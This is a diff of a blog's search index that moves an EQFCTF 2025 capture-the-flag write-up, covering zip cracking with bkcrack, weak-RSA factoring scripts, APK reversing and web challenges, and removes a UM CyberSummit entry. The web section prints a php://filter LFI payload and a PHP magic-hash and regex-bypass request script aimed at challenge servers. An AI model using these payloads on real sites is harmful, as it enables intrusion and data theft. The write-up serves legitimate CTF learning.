-<li><strong>Write custom scripts</strong> to hook functions, modify behavior, or extract data: <div class="code-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="title class_">MainActivity</span> = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&#x27;com.example.app.MainActivity&#x27;</span>);</span><br><span class="line">    <span class="title class_">MainActivity</span>.<span class="property">someMethod</span>.<span class="property">implementation</span> = <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;someMethod called&#x27;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="title function_">someMethod</span>();</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></div></li>
-</ol>
-]]></content>
-      <tags>
-        <tag>APK</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>EQFCTF 2025</title>
-    <url>/2025/01/18/EQFCTF-2025/</url>
-    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\node_modules\aplayer\dist\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\node_modules\aplayer\dist\Meting.min.js"></script><h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><h2 id="Join-Our-Discord"><a href="#Join-Our-Discord" class="headerlink" title="Join Our Discord"></a>Join Our Discord</h2><ul>
-<li>Just join the discord and there is the flag on the annoucment channel <code>RVFDVEZ7VzNsQzBtM19UMF9FcXVpbGlicml1bV9EMXNjMHJkfQ==</code><br>cyberchef it and get the flag <code>EQCTF&#123;W3lC0m3_T0_Equilibrium_D1sc0rd&#125;</code></li>
-</ul>
-<h1 id="Forensic"><a href="#Forensic" class="headerlink" title="Forensic"></a>Forensic</h1><h2 id="Velociraptor"><a href="#Velociraptor" class="headerlink" title="Velociraptor"></a>Velociraptor</h2><ol>
-<li>Download the attach file</li>
-<li>VeLoCiraptor\C\Users\kelvin\AppData\Roaming\Microsoft\Windows\Recent<ul>
-<li>We can found some hash on this page with the file name <code>RVFDVEZ7MXRzX3IzNExseV9o and MG1ldzBya190UnVTdF9tMyF9</code><br> <img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/image/image.png"
-                      alt="image"
-                ></li>
-</ul>
-</li>
-<li>Then just cyberchef it.</li>
-</ol>
-<h2 id="Kuih-Lapis"><a href="#Kuih-Lapis" class="headerlink" title="Kuih Lapis"></a>Kuih Lapis</h2><ol>
-<li>Download the poem.pdf file</li>
-<li>Throw it into <a class="link"   href="https://pdfcrowd.com/inspect-pdf/" >pdf inspect<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a> website and we will see all the details in this page<br><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/image/image11.png"
-                      alt="image"
-                ></li>
-<li>And we can see the details and flag at here <img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/image/image222.png"
-                      alt="image"
-                ></li>
-</ol>
-<h2 id="Lost-Password"><a href="#Lost-Password" class="headerlink" title="Lost Password"></a>Lost Password</h2><ol>
-<li>Download the zip file.</li>
-<li>We can see inside have cloud_password.txt and a index.html file. <img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/image/imagebk1.png"
-                      alt="image"
-                ></li>
-<li>With the use of BKCrack, we can use known plaintext attack on pkzip</li>
-<li>Next find the common bytes in the index.html file(why html file? as we dont know the starters of the cloud_password.txt) <img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/image/imagebk2.png"
-                      alt="image"
-                >.</li>
-<li>Save those code in a file call bin </li>
-<li>Then <code>bkcrack -C html.zip -c &quot;index.html&quot; -p bin</code></li>
-<li>After getting the key, Continue to crack it</li>
-<li><code>bkcrack -C html.zip -k 1d63e85a b3b66126 33619315 -U bkbk.zip 1234</code></li>
-</ol>
-<p>1d63e85a b3b66126 33619315 is the key, and 1234 is the password we set.<br>9. then unzip the zip file bkbk.zip with pass 1234.<br>10. Thats it the flag here<br><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/image/imagelah.png"
-                      alt="flag"
-                ></p>
-<h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h2 id="Neighbour-RSA"><a href="#Neighbour-RSA" class="headerlink" title="Neighbour RSA"></a>Neighbour RSA</h2><ol>
-<li>Download the file, then see the rsa encrypted code<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">from Crypto.Util.number import inverse, long_to_bytes</span><br><span class="line">from gmpy2 import isqrt, mpz</span><br><span class="line">def fermat_factorization(N):</span><br><span class="line">    a = isqrt(N) + 1</span><br><span class="line">    b2 = a * a - N</span><br><span class="line">    while not is_square(b2):</span><br><span class="line">        a += 1</span><br><span class="line">        b2 = a * a - N</span><br><span class="line">    b = isqrt(b2)</span><br><span class="line">    return a - b, a + b</span><br><span class="line"></span><br><span class="line">def is_square(n):</span><br><span class="line">    return isqrt(n) ** 2 == n</span><br><span class="line"></span><br><span class="line"># Given values</span><br><span class="line">N = 14587704432822344892341272427282646120364434437414523883376089608218979364959927948590898540264210246449374363014541914863792835772986609660515612532877044074684115597786182642011407163350289201826895454398548254854919237599957739718174053771619150887665707867636064460914489445835497948439951659044458159773886454887057327846897569977945202458245268351728125973721764332352011029125694046428350269451464778793326007087955043888570293765138721335344787054343738337660927131968049415376352589981259058448540690666004751490375493430556965591293772542601776934892741235532054785639594081598607404023545471998403197674267</span><br><span class="line">e = 65537</span><br><span class="line">C = 7329184746351979600304810893726842767688467204256990201181172159445966473650977905122553415838916142690364388789400790015517642902297387406215773278164829517035052625373870964570981590734714495297149889660019174034119566329569798047522829383224123884562703447321306836996392334132844673471179765556339187200820259655159008340673516040862000226792914228312336356120448967504158288031247387263438925257977725844911872753683719735641011693324441777888582417108481882731436005780409094974241968759397096299213838515746566064813787517925040756180508206242396925444425306180593790729890681708626826056328684043890127100581</span><br><span class="line"></span><br><span class="line"># Step 1: Factorize N</span><br><span class="line">p, q = fermat_factorization(N)</span><br><span class="line">print(f&quot;p = &#123;p&#125;&quot;)</span><br><span class="line">print(f&quot;q = &#123;q&#125;&quot;)</span><br><span class="line"></span><br><span class="line"># Step 2: Compute the private key d</span><br><span class="line">phi = (p - 1) * (q - 1)</span><br><span class="line">d = inverse(e, phi)</span><br><span class="line">print(f&quot;d = &#123;d&#125;&quot;)</span><br><span class="line"></span><br><span class="line"># Step 3: Decrypt the ciphertext C</span><br><span class="line">plaintext = pow(C, d, N)</span><br><span class="line">print(f&quot;Plaintext (as long): &#123;plaintext&#125;&quot;)</span><br><span class="line"></span><br><span class="line"># Step 4: Convert the plaintext to bytes</span><br><span class="line">flag = long_to_bytes(plaintext)</span><br><span class="line">print(f&quot;Flag: &#123;flag.decode()&#125;&quot;)</span><br></pre></td></tr></table></figure></div></li>
-<li>Then decrypt it! <div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">from Crypto.Util.number import inverse, long_to_bytes</span><br><span class="line">from gmpy2 import isqrt, mpz</span><br><span class="line">def fermat_factorization(N):</span><br><span class="line">a = isqrt(N) + 1</span><br><span class="line">b2 = a * a - N</span><br><span class="line">while not is_square(b2):</span><br><span class="line">    a += 1</span><br><span class="line">    b2 = a * a - N</span><br><span class="line">b = isqrt(b2)</span><br><span class="line">return a - b, a + b</span><br><span class="line"></span><br><span class="line">def is_square(n):</span><br><span class="line">return isqrt(n) ** 2 == n</span><br><span class="line"></span><br><span class="line"># Given values</span><br><span class="line">N = 14587704432822344892341272427282646120364434437414523883376089608218979364959927948590898540264210246449374363014541914863792835772986609660515612532877044074684115597786182642011407163350289201826895454398548254854919237599957739718174053771619150887665707867636064460914489445835497948439951659044458159773886454887057327846897569977945202458245268351728125973721764332352011029125694046428350269451464778793326007087955043888570293765138721335344787054343738337660927131968049415376352589981259058448540690666004751490375493430556965591293772542601776934892741235532054785639594081598607404023545471998403197674267</span><br><span class="line">e = 65537</span><br><span class="line">C = 7329184746351979600304810893726842767688467204256990201181172159445966473650977905122553415838916142690364388789400790015517642902297387406215773278164829517035052625373870964570981590734714495297149889660019174034119566329569798047522829383224123884562703447321306836996392334132844673471179765556339187200820259655159008340673516040862000226792914228312336356120448967504158288031247387263438925257977725844911872753683719735641011693324441777888582417108481882731436005780409094974241968759397096299213838515746566064813787517925040756180508206242396925444425306180593790729890681708626826056328684043890127100581</span><br><span class="line"></span><br><span class="line"># Step 1: Factorize N</span><br><span class="line">p, q = fermat_factorization(N)</span><br><span class="line">print(f&quot;p = &#123;p&#125;&quot;)</span><br><span class="line">print(f&quot;q = &#123;q&#125;&quot;)</span><br><span class="line"></span><br><span class="line"># Step 2: Compute the private key d</span><br><span class="line">phi = (p - 1) * (q - 1)</span><br><span class="line">d = inverse(e, phi)</span><br><span class="line">print(f&quot;d = &#123;d&#125;&quot;)</span><br><span class="line"></span><br><span class="line"># Step 3: Decrypt the ciphertext C</span><br><span class="line">plaintext = pow(C, d, N)</span><br><span class="line">print(f&quot;Plaintext (as long): &#123;plaintext&#125;&quot;)</span><br><span class="line"></span><br><span class="line"># Step 4: Convert the plaintext to bytes</span><br><span class="line">flag = long_to_bytes(plaintext)</span><br><span class="line">print(f&quot;Flag: &#123;flag.decode()&#125;&quot;)&lt;/p&gt;</span><br></pre></td></tr></table></figure></div></li>
-<li>and here is it the flag</li>
-</ol>
-<h2 id="Neighbour-RSA-2"><a href="#Neighbour-RSA-2" class="headerlink" title="Neighbour RSA_2"></a>Neighbour RSA_2</h2><ol>
-<li>Here is the original code provided<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">from Crypto.Util.number import *</span><br><span class="line">from gmpy2 import prev_prime as next_prime</span><br><span class="line">import secrets</span><br><span class="line"></span><br><span class="line">flag = b&quot;EQCTF&#123;&lt;REDACTED&gt;&#125;&quot;</span><br><span class="line">a = bytes_to_long(secrets.token_bytes(100))</span><br><span class="line"></span><br><span class="line">p = getPrime(1024)</span><br><span class="line">q = next_prime(a+p)</span><br><span class="line"></span><br><span class="line">N = int(p*q)</span><br><span class="line">e = 65537</span><br><span class="line">f = int(q+a-p)</span><br><span class="line"></span><br><span class="line">C = pow(bytes_to_long(flag),e,N)</span><br><span class="line"></span><br><span class="line">print(f&quot;&#123;N=&#125;&quot;)</span><br><span class="line">print(f&quot;&#123;e=&#125;&quot;)</span><br><span class="line">print(f&quot;&#123;C=&#125;&quot;)</span><br><span class="line">print(f&quot;&#123;f=&#125;&quot;)</span><br><span class="line"></span><br><span class="line"># N=10986069679740899320769487987259965136338163538313920951921558170716399011131571749355967327929782757252961432250665732844670832757630969990974354211674665217879301194915967815961901955331119097862220567741900953344002421010199387139438258915388299120537312319419560196095221842536034797857570594271497968571543268632342368822758109031157038270115475046299925831141039892806064466450571546834222025788616070408548026473179492912530200671560292851465500255213172920644302815477881129226831758156389887396481079039150256181152083078507883863985140189407376955776873853730599843478872399976242973508423433618152961348309</span><br><span class="line"># e=65537</span><br><span class="line"># C=2195468989281538327484120144714886786222108443822386213335264431639447179575013802497596322014889540032797783666693430103844035492180467143334243466603968944829680836129211979667061913058333561267630828758422011805278536599370681276716534375047691415305153173304117404635308274845621779917651565487097467077938208235595083835638297185421167329868537607503750906624903899336968072524704962983010525959106240384416922803445710408493786560172567404469778095227805268385869729463091111594408973206573286013513443234182105724723290297083787222131780636442462497223002541517291130831271935451970740180808267897428166746499</span><br><span class="line"># f=4203301120017181153512192371191327436380286582036247438379481982220240276670686609670968370331071343886281566516951351186472802979725501149166852576293749655990806367361286991990410689444889766967820170478115967009340001288791419622177173652</span><br></pre></td></tr></table></figure></div></li>
-<li>Decrypt it<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">from Crypto.Util.number import long_to_bytes, inverse</span><br><span class="line">from gmpy2 import isqrt</span><br><span class="line"></span><br><span class="line"># Given values</span><br><span class="line">N = 10986069679740899320769487987259965136338163538313920951921558170716399011131571749355967327929782757252961432250665732844670832757630969990974354211674665217879301194915967815961901955331119097862220567741900953344002421010199387139438258915388299120537312319419560196095221842536034797857570594271497968571543268632342368822758109031157038270115475046299925831141039892806064466450571546834222025788616070408548026473179492912530200671560292851465500255213172920644302815477881129226831758156389887396481079039150256181152083078507883863985140189407376955776873853730599843478872399976242973508423433618152961348309</span><br><span class="line">e = 65537</span><br><span class="line">C = 2195468989281538327484120144714886786222108443822386213335264431639447179575013802497596322014889540032797783666693430103844035492180467143334243466603968944829680836129211979667061913058333561267630828758422011805278536599370681276716534375047691415305153173304117404635308274845621779917651565487097467077938208235595083835638297185421167329868537607503750906624903899336968072524704962983010525959106240384416922803445710408493786560172567404469778095227805268385869729463091111594408973206573286013513443234182105724723290297083787222131780636442462497223002541517291130831271935451970740180808267897428166746499</span><br><span class="line">f = 4203301120017181153512192371191327436380286582036247438379481982220240276670686609670968370331071343886281566516951351186472802979725501149166852576293749655990806367361286991990410689444889766967820170478115967009340001288791419622177173652</span><br><span class="line"></span><br><span class="line"># Approximate a</span><br><span class="line">a_approx = f // 2</span><br><span class="line"></span><br><span class="line"># Define a small range around a_approx</span><br><span class="line">range_size = 1000  # Adjust this range as needed</span><br><span class="line"></span><br><span class="line"># Iterate over the range</span><br><span class="line">for delta in range(-range_size, range_size + 1):</span><br><span class="line">    a = a_approx + delta</span><br><span class="line"></span><br><span class="line">    # Solve the quadratic equation: p^2 + (f - a) * p - N = 0</span><br><span class="line">    A = 1</span><br><span class="line">    B = f - a</span><br><span class="line">    C_eq = -N</span><br><span class="line"></span><br><span class="line">    # Discriminant</span><br><span class="line">    discriminant = B**2 - 4 * A * C_eq</span><br><span class="line"></span><br><span class="line">    # Check if discriminant is a perfect square</span><br><span class="line">    if discriminant &gt;= 0:</span><br><span class="line">        sqrt_discriminant = isqrt(discriminant)</span><br><span class="line">        if sqrt_discriminant * sqrt_discriminant == discriminant:</span><br><span class="line">            # Solve for p</span><br><span class="line">            p_candidate = (-B + sqrt_discriminant) // (2 * A)</span><br><span class="line"></span><br><span class="line">            # Check if p_candidate is a factor of N</span><br><span class="line">            if N % p_candidate == 0:</span><br><span class="line">                p = p_candidate</span><br><span class="line">                q = N // p</span><br><span class="line">                print(f&quot;Found p and q:&quot;)</span><br><span class="line">                print(f&quot;p = &#123;p&#125;&quot;)</span><br><span class="line">                print(f&quot;q = &#123;q&#125;&quot;)</span><br><span class="line"></span><br><span class="line">                # Compute phi(N)</span><br><span class="line">                phi = (p - 1) * (q - 1)</span><br><span class="line"></span><br><span class="line">                # Compute the private key d</span><br><span class="line">                d = inverse(e, phi)</span><br><span class="line"></span><br><span class="line">                # Decrypt the ciphertext</span><br><span class="line">                plaintext = pow(C, d, N)</span><br><span class="line"></span><br><span class="line">                # Convert the plaintext to bytes</span><br><span class="line">                flag = long_to_bytes(plaintext)</span><br><span class="line">                print(f&quot;Flag: &#123;flag.decode()&#125;&quot;)</span><br><span class="line">                break</span><br><span class="line">    else:</span><br><span class="line">        continue</span><br><span class="line">else:</span><br><span class="line">    print(&quot;Failed to factorize N.&quot;)</span><br></pre></td></tr></table></figure></div></li>
-<li>Anddd there you go the flag</li>
-</ol>
-<h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><h2 id="EggSecret"><a href="#EggSecret" class="headerlink" title="EggSecret"></a>EggSecret</h2><ol>
-<li><p>First download the file attached and lets see whats inside.</p>
-</li>
-<li><p>We can see that there is a secret hash at there <code>00e39786989574093743872279278460</code> also there is something we need to bypass <code>(preg_match(&quot;/^(.*?)+$/s&quot;, $egg))</code></p>
-</li>
-<li><div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line">url = &quot;http://135.181.88.229:31730/&quot;</span><br><span class="line">params = &#123;&quot;eggSecret&quot;: &quot;240610708&quot;&#125;  # String with MD5 hash starting with &quot;0e&quot;</span><br><span class="line">data = &#123;&quot;egg&quot;: &quot;A&quot; * 10000&#125;  # Very large input to bypass the regex</span><br><span class="line">response = requests.post(url, params=params, data=data)</span><br><span class="line">print(response.text)</span><br></pre></td></tr></table></figure></div>
-</li>
-<li><p>and we can get the flag content.</p>
-</li>
-</ol>
-<h2 id="KingsBrew"><a href="#KingsBrew" class="headerlink" title="KingsBrew"></a>KingsBrew</h2><ol>
-<li>First we get into the website using the host and port given.</li>
-<li>According to the hint it should be something menu as when you press {drink and flag!} it jump out menu.php.</li>
-<li>After we test, LFI is usable in this case</li>
-<li><code>http://135.181.88.229:35206/?page=php://filter/convert.base64-encode/resource=menu.php</code></li>
-<li>This is one of LFI payloads of PHP filters to read menu.php without executing PHP and decode the base 64 by ourself using cyberchef.</li>
-</ol>
-<h1 id="Mobile"><a href="#Mobile" class="headerlink" title="Mobile"></a>Mobile</h1><h2 id="Who’s-that-pukimon"><a href="#Who’s-that-pukimon" class="headerlink" title="Who’s that pukimon"></a>Who’s that pukimon</h2><ol>
-<li>Download the APK Andorid files and open it in a android emulator(Im using andorid studio)</li>
-<li>We can see that this is a game that we need to guess who is this Pokemon (pukimon)<br><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/image/22.png"
-                      alt="gueessss"
-                ></li>
-<li>With the use of jadx-gui</li>
-<li>We can see that the main activity files is mainactivity<br><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/image/11.png"
-                      alt="main"
-                ></li>
-<li>Find it out at (source&#x2F;io.eqctf.pukimon&#x2F;MainActivitykt) </li>
-<li><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/image/33.png"
-                      alt="hey"
-                ><div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">    /* JADX INFO: Access modifiers changed from: private */</span><br><span class="line">    public static final Unit a$lambda$11$lambda$10(Context yeet, MutableState a$delegate) &#123;</span><br><span class="line">        Intrinsics.checkNotNullParameter(yeet, &quot;$yeet&quot;);</span><br><span class="line">        Intrinsics.checkNotNullParameter(a$delegate, &quot;$a$delegate&quot;);</span><br><span class="line">        if (a(a$lambda$6(a$delegate))) &#123;</span><br><span class="line">            Toast.makeText(yeet, &quot;It&#x27;s &quot; + a$lambda$6(a$delegate), 0).show();</span><br><span class="line">            byte[] decode = Base64.decode(&quot;AEUAUQBDAFQARgB7ADEAVABzAF8AUwBoAHIAMABvAE0AcgAxAHMASABpAEUAIQAhACEAIQB9&quot;, 0);</span><br><span class="line">            Intrinsics.checkNotNullExpressionValue(decode, &quot;decode(...)&quot;);</span><br><span class="line">            Log.d(&quot;Flag&quot;, &quot;Congratz on guessing the pokemon: &quot;.concat(new String(decode, Charsets.UTF_8)));</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            Toast.makeText(yeet, &quot;It&#x27;s not &quot; + a$lambda$6(a$delegate), 0).show();</span><br><span class="line">        &#125;</span><br><span class="line">        return Unit.INSTANCE;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div></li>
-<li>Decode <code>AEUAUQBDAFQARgB7ADEAVABzAF8AUwBoAHIAMABvAE0AcgAxAHMASABpAEUAIQAhACEAIQB9</code> with cyberchef and we can get the flag EQCTF{1Ts_Shr0oMr1sHiE!!!!}</li>
-</ol>
-<h2 id="Capture-that-Pukimon"><a href="#Capture-that-Pukimon" class="headerlink" title="Capture that Pukimon"></a>Capture that Pukimon</h2><ol>
-<li>With the use of http toolkit, we can intercept the data from the firebase<br><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/image/shrommie.png"
-                      alt="shrommie"
-                ></li>
-<li>And thats the flag EQCTF{Int3RcEpT_da_Tr3FfiC}”</li>
-</ol>
-]]></content>
-      <categories>
-        <category>CTF 2025</category>
-      </categories>
-      <tags>
-        <tag>Forensics</tag>
-        <tag>Web</tag>
       </tags>
   </entry>
   <entry>
@@ -1125,19 +972,132 @@
       </tags>
   </entry>
   <entry>
-    <title>UM CyberSummit 2025</title>
-    <url>/2025/04/18/UM-CyberSummit-2025/</url>
-    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\node_modules\aplayer\dist\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\node_modules\aplayer\dist\Meting.min.js"></script><h1 id="🔗-Check-Out-Our-Website"><a href="#🔗-Check-Out-Our-Website" class="headerlink" title="🔗 Check Out Our Website"></a>🔗 Check Out Our Website</h1><p>👉 <a class="link"   href="https://cyberxutm.github.io/blog/umcsctf-24/" >UMCS CTF Blog<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
-<hr>
-<h2 id="📄-CTF-Preliminary-Round-Writeup"><a href="#📄-CTF-Preliminary-Round-Writeup" class="headerlink" title="📄 CTF Preliminary Round Writeup"></a>📄 CTF Preliminary Round Writeup</h2><iframe src="/files/UMCS CTF Preliminary Round Writeups.pdf" width="100%" height="600px" style="border: none;">
-    This browser does not support PDF viewing. You can <a href="/files/UMCS CTF Preliminary Round Writeups.pdf">download the writeup here</a>.
-</iframe>
-
-<hr>
-<h2 id="✍️-Writeup-Credits"><a href="#✍️-Writeup-Credits" class="headerlink" title="✍️ Writeup Credits"></a>✍️ Writeup Credits</h2><p>This writeup is compiled by <strong>@gr1d</strong><br>Written by <strong>@tony</strong>, <strong>@gr1d</strong>, <strong>@bakayang</strong>, and <strong>@me</strong><br>🛡️ Team: <strong>bWrg3r x UTM</strong></p>
+    <title>EQFCTF 2025</title>
+    <url>/2025/01/18/EQFCTF-2025/</url>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\node_modules\aplayer\dist\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\node_modules\aplayer\dist\Meting.min.js"></script><h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><h2 id="Join-Our-Discord"><a href="#Join-Our-Discord" class="headerlink" title="Join Our Discord"></a>Join Our Discord</h2><ul>
+<li>Just join the discord and there is the flag on the annoucment channel <code>RVFDVEZ7VzNsQzBtM19UMF9FcXVpbGlicml1bV9EMXNjMHJkfQ==</code><br>cyberchef it and get the flag <code>EQCTF&#123;W3lC0m3_T0_Equilibrium_D1sc0rd&#125;</code></li>
+</ul>
+<h1 id="Forensic"><a href="#Forensic" class="headerlink" title="Forensic"></a>Forensic</h1><h2 id="Velociraptor"><a href="#Velociraptor" class="headerlink" title="Velociraptor"></a>Velociraptor</h2><ol>
+<li>Download the attach file</li>
+<li>VeLoCiraptor\C\Users\kelvin\AppData\Roaming\Microsoft\Windows\Recent<ul>
+<li>We can found some hash on this page with the file name <code>RVFDVEZ7MXRzX3IzNExseV9o and MG1ldzBya190UnVTdF9tMyF9</code><br> <img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/image/image.png"
+                      alt="image"
+                ></li>
+</ul>
+</li>
+<li>Then just cyberchef it.</li>
+</ol>
+<h2 id="Kuih-Lapis"><a href="#Kuih-Lapis" class="headerlink" title="Kuih Lapis"></a>Kuih Lapis</h2><ol>
+<li>Download the poem.pdf file</li>
+<li>Throw it into <a class="link"   href="https://pdfcrowd.com/inspect-pdf/" >pdf inspect<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a> website and we will see all the details in this page<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/image/image11.png"
+                      alt="image"
+                ></li>
+<li>And we can see the details and flag at here <img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/image/image222.png"
+                      alt="image"
+                ></li>
+</ol>
+<h2 id="Lost-Password"><a href="#Lost-Password" class="headerlink" title="Lost Password"></a>Lost Password</h2><ol>
+<li>Download the zip file.</li>
+<li>We can see inside have cloud_password.txt and a index.html file. <img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/image/imagebk1.png"
+                      alt="image"
+                ></li>
+<li>With the use of BKCrack, we can use known plaintext attack on pkzip</li>
+<li>Next find the common bytes in the index.html file(why html file? as we dont know the starters of the cloud_password.txt) <img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/image/imagebk2.png"
+                      alt="image"
+                >.</li>
+<li>Save those code in a file call bin </li>
+<li>Then <code>bkcrack -C html.zip -c &quot;index.html&quot; -p bin</code></li>
+<li>After getting the key, Continue to crack it</li>
+<li><code>bkcrack -C html.zip -k 1d63e85a b3b66126 33619315 -U bkbk.zip 1234</code></li>
+</ol>
+<p>1d63e85a b3b66126 33619315 is the key, and 1234 is the password we set.<br>9. then unzip the zip file bkbk.zip with pass 1234.<br>10. Thats it the flag here<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/image/imagelah.png"
+                      alt="flag"
+                ></p>
+<h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h2 id="Neighbour-RSA"><a href="#Neighbour-RSA" class="headerlink" title="Neighbour RSA"></a>Neighbour RSA</h2><ol>
+<li>Download the file, then see the rsa encrypted code<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">from Crypto.Util.number import inverse, long_to_bytes</span><br><span class="line">from gmpy2 import isqrt, mpz</span><br><span class="line">def fermat_factorization(N):</span><br><span class="line">    a = isqrt(N) + 1</span><br><span class="line">    b2 = a * a - N</span><br><span class="line">    while not is_square(b2):</span><br><span class="line">        a += 1</span><br><span class="line">        b2 = a * a - N</span><br><span class="line">    b = isqrt(b2)</span><br><span class="line">    return a - b, a + b</span><br><span class="line"></span><br><span class="line">def is_square(n):</span><br><span class="line">    return isqrt(n) ** 2 == n</span><br><span class="line"></span><br><span class="line"># Given values</span><br><span class="line">N = 14587704432822344892341272427282646120364434437414523883376089608218979364959927948590898540264210246449374363014541914863792835772986609660515612532877044074684115597786182642011407163350289201826895454398548254854919237599957739718174053771619150887665707867636064460914489445835497948439951659044458159773886454887057327846897569977945202458245268351728125973721764332352011029125694046428350269451464778793326007087955043888570293765138721335344787054343738337660927131968049415376352589981259058448540690666004751490375493430556965591293772542601776934892741235532054785639594081598607404023545471998403197674267</span><br><span class="line">e = 65537</span><br><span class="line">C = 7329184746351979600304810893726842767688467204256990201181172159445966473650977905122553415838916142690364388789400790015517642902297387406215773278164829517035052625373870964570981590734714495297149889660019174034119566329569798047522829383224123884562703447321306836996392334132844673471179765556339187200820259655159008340673516040862000226792914228312336356120448967504158288031247387263438925257977725844911872753683719735641011693324441777888582417108481882731436005780409094974241968759397096299213838515746566064813787517925040756180508206242396925444425306180593790729890681708626826056328684043890127100581</span><br><span class="line"></span><br><span class="line"># Step 1: Factorize N</span><br><span class="line">p, q = fermat_factorization(N)</span><br><span class="line">print(f&quot;p = &#123;p&#125;&quot;)</span><br><span class="line">print(f&quot;q = &#123;q&#125;&quot;)</span><br><span class="line"></span><br><span class="line"># Step 2: Compute the private key d</span><br><span class="line">phi = (p - 1) * (q - 1)</span><br><span class="line">d = inverse(e, phi)</span><br><span class="line">print(f&quot;d = &#123;d&#125;&quot;)</span><br><span class="line"></span><br><span class="line"># Step 3: Decrypt the ciphertext C</span><br><span class="line">plaintext = pow(C, d, N)</span><br><span class="line">print(f&quot;Plaintext (as long): &#123;plaintext&#125;&quot;)</span><br><span class="line"></span><br><span class="line"># Step 4: Convert the plaintext to bytes</span><br><span class="line">flag = long_to_bytes(plaintext)</span><br><span class="line">print(f&quot;Flag: &#123;flag.decode()&#125;&quot;)</span><br></pre></td></tr></table></figure></div></li>
+<li>Then decrypt it! <div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">from Crypto.Util.number import inverse, long_to_bytes</span><br><span class="line">from gmpy2 import isqrt, mpz</span><br><span class="line">def fermat_factorization(N):</span><br><span class="line">a = isqrt(N) + 1</span><br><span class="line">b2 = a * a - N</span><br><span class="line">while not is_square(b2):</span><br><span class="line">    a += 1</span><br><span class="line">    b2 = a * a - N</span><br><span class="line">b = isqrt(b2)</span><br><span class="line">return a - b, a + b</span><br><span class="line"></span><br><span class="line">def is_square(n):</span><br><span class="line">return isqrt(n) ** 2 == n</span><br><span class="line"></span><br><span class="line"># Given values</span><br><span class="line">N = 14587704432822344892341272427282646120364434437414523883376089608218979364959927948590898540264210246449374363014541914863792835772986609660515612532877044074684115597786182642011407163350289201826895454398548254854919237599957739718174053771619150887665707867636064460914489445835497948439951659044458159773886454887057327846897569977945202458245268351728125973721764332352011029125694046428350269451464778793326007087955043888570293765138721335344787054343738337660927131968049415376352589981259058448540690666004751490375493430556965591293772542601776934892741235532054785639594081598607404023545471998403197674267</span><br><span class="line">e = 65537</span><br><span class="line">C = 7329184746351979600304810893726842767688467204256990201181172159445966473650977905122553415838916142690364388789400790015517642902297387406215773278164829517035052625373870964570981590734714495297149889660019174034119566329569798047522829383224123884562703447321306836996392334132844673471179765556339187200820259655159008340673516040862000226792914228312336356120448967504158288031247387263438925257977725844911872753683719735641011693324441777888582417108481882731436005780409094974241968759397096299213838515746566064813787517925040756180508206242396925444425306180593790729890681708626826056328684043890127100581</span><br><span class="line"></span><br><span class="line"># Step 1: 